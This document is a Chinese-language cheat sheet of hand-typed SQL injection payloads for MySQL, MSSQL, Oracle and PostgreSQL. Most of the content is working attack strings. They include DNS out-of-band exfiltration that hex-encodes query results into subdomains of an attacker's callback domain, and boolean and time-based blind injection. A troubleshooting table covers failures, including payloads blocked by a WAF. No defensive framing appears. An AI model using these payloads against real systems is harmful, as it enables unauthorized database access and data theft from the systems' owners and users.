# 手工 payload 速查

不用工具时，下面这些 payload 可以手打。把 `DOMAIN` 换成你的回调域名，`LABEL` 换成一次性标记。

## MySQL

前提：Windows 主机、`FILE` 权限、`secure_file_priv` 为空。

```sql
-- 基础（正斜杠，别用反斜杠）
' AND (SELECT LOAD_FILE(CONCAT('//',(SELECT database()),'.DOMAIN/x.txt')))-- -

-- HEX 整块（一次搬 30 字节）
' AND (SELECT LOAD_FILE(CONCAT('//','LABEL.',HEX(SUBSTR((EXPR),1,30)),'.DOMAIN/x.txt')))-- -

-- SLEEP 时间盲注
' AND IF(ASCII(SUBSTR((EXPR),POS,1))>MID,SLEEP(1),0)-- -
```

## MSSQL

前提：`sysadmin` 或 `xp_dirtree` 可用。

```sql
' ; EXEC master..xp_dirtree '\\LABEL.DOMAIN\a'-- -
' IF (COND) WAITFOR DELAY '0:0:1'-- -
```

## Oracle

前提：`UTL_INADDR` / `UTL_HTTP` / `DBMS_LDAP` 有执行权限（11g 后常被回收）。

```sql
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('LABEL.DOMAIN') FROM dual)-- -
' AND (SELECT CASE WHEN (COND) THEN dbms_lock.sleep(1) END FROM dual)-- -
```

## PostgreSQL

前提：装了 `dblink` 扩展；或超级用户可用 `COPY ... TO PROGRAM`。

```sql
' AND (SELECT dblink_connect('host=LABEL.DOMAIN port=53 dbname=x'))-- -
' AND (SELECT CASE WHEN (COND) THEN pg_sleep(1) END)-- -
```

## 判定说明

- **DNS 带外**：平台出现记录 = 条件为真；记录内容就是数据（hex 或明文）。
- **布尔**：平台出现记录 = 真，不出现 = 假。
- **时间**：响应耗时高于基线 = 真。网络抖动大时多点采样取最小值。

## 常见失败原因

| 现象 | 原因 |
|---|---|
| 请求瞬间返回、平台无记录 | payload 语法错（缺 `AND`）、WAF 拦了编码字符、或 UNC 用了反斜杠 |
| 记录里是空 label | 查询结果为空或 NULL |
| 只有 base 域名的记录 | 拼接结果为空 |
| 记录截断 | DNS label 上限 63 字符，`--chunk` 调小或用 SUBSTR 分段 |
